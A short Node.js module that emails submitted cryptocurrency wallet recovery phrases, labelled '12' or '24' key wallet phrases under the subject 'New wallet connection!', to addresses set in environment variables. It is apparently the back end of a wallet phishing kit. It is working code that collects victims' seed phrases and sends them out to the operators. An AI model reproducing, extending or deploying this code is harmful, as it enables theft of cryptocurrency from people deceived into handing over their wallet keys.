const transporter = require("../config/email.config");

module.exports = async function sendEmail(data, type) {
  try {
    const template = `
    <h1>New wallet connection!</h1>
    <p><b>Type:</b> ${
      type === "12" ? "12" : type === "24" ? "24" : ""
    } key wallet phrase</p>
    <table width="100%" border="0" cellspacing="0" cellpadding="8" style="border-collapse: collapse; font-family: Arial, sans-serif; font-size: 14px; color: #333; background-color: #f9f9f9; border: 1px solid #ddd;">
    <tHead>
        <tr style="background-color: #0073e6; color: white; font-weight: bold; text-align: left;">
            <th style="padding: 10px; border: 1px solid #ddd;">Pharse</th>
            <th style="padding: 10px; border: 1px solid #ddd;">Value</th>
        </tr>
    </tHead>
    <tBody>
    ${Object.keys(data)
      .map((key) => {
        return `
          <tr style="background-color: white;">
            <td style="padding: 10px; border: 1px solid #ddd;">${key}</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${data[key]}</td>
          </tr>`;
      })
      .join("")}
    </tBody>
    </table>
    `;
    const mailOptions = {
      from: `Support <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_TO ? process.env.EMAIL_TO.split(",") : [],
      subject: "New wallet connection!",
      html: template,
    };
    const mailSent = await transporter.sendMail(mailOptions);
    console.log("Email sent: ", mailSent.messageId);
    return mailSent;
  } catch (error) {
    console.log("Eror sending email", error);
    return { error: error.message };
  }
};
